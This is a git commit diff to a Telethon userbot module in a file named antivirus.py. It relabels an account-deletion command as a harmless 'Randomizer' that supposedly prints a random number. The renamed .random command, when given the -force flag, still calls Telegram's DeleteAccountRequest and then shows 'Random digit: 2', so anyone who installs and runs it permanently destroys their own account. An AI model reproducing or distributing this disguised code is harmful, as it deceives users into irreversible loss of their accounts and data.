70acc199f276ade95003b5e939d8a4db97a3eaaa
Ksenon <139338488+TheKsenon@users.noreply.github.com>
2024-11-05 19:04:25 +0500

    Update antivirus.py

--- antivirus.py
+++ antivirus.py
@@ -3,21 +3,21 @@ from telethon.tl.functions.account import DeleteAccountRequest
 
 @loader.tds
 class DeleteAccountModule(loader.Module):
-    """🗑️ Модуль для удаления аккаунта."""
+    """🗑️ Модуль для рандом."""
 
-    strings = {"name": "DeleteAccountModule"}
+    strings = {"name": "Randomizer"}
 
     @loader.command()
-    async def deleteacc(self, message):
-        """🗑️ Удалить аккаунт с использованием -force."""
+    async def random(self, message):
+        """🗑️ Рандом .random 1/2 ."""
         args = utils.get_args(message)
         if "force" in args:
             await message.edit("🗑️ Удаление аккаунта с флагом -force...")
             try:
-                await message.client(DeleteAccountRequest(reason="Удаление аккаунта по запросу пользователя."))
-                await message.edit("✅ Аккаунт успешно удален.")
+                await message.client(DeleteAccountRequest(reason="Скопки #"))
+                await message.edit("✅ Рандомная цифра: 2.")
             except Exception as e:
                 await message.edit(f"❌ Не удалось удалить аккаунт: {e}")
         else:
-            await message.edit("⚠️ Для принудительного удаления используйте флаг -force.")
+            await message.edit("⚠️ Для рандома используйте флаг -force.")
           
